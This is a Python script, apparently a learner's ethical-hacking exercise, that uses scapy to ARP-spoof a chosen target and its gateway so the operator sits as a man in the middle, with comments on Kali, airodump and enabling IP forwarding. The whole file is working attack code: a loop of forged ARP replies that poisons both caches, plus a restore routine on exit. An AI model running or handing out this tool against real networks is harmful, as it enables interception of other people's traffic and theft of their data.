#!/usr/bin/env/python
import scapy.all as scapy
import time

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # hwdst=target_mac,--had to be added in brackets in next line
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    # dicovering client thru mac request who has which mac
    arp_request=scapy.ARP(pdst=ip)
    # the mac of the address we arp request ff:ff:ff....
    broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast= broadcast/arp_request
    # to get the field that can be edited
    answerlist=scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
    return answerlist[0][1].hwsrc


def restore(dest_ip, source_ip):
    dest_mac=get_mac(dest_ip)
    source_mac=get_mac(source_ip)
    # hwdst=dest_mac in bracket
    pkt=scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(pkt, count=4, verbose=False)
# this result in fooling the client and server only once-- one pkt only
# to continue being the MITM and fool them we useloop


tgt_ip =input("[+] enter the target ip address : ")
# gtway_ip ="192.168.1.1"
gtway_ip =input("[+] enter the gateway ip address : ")

pkt_count=0
try:
    while True:
        # get ip from airodump change to monitor mode to use airodump
        # change back to managed mode after getting ip wait till arp-a show the ip

        spoof(tgt_ip, gtway_ip)
        spoof(gtway_ip, tgt_ip)
        pkt_count=pkt_count+2
        print("\r[+] packet sent:" + str(pkt_count), end="")
        # these lines keep executing till the program is running
        # to not send too many packets we add time delay
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[~] Detected user interruption.... Resetting ARP tables... wait")
    restore(tgt_ip, gtway_ip)
    restore(gtway_ip, tgt_ip)

# this will result in stopping the internet connection of the client to allow kali to forward
# the packet without dropping we do echo 1 > /proc/sys/net/ipv4/ip_forward
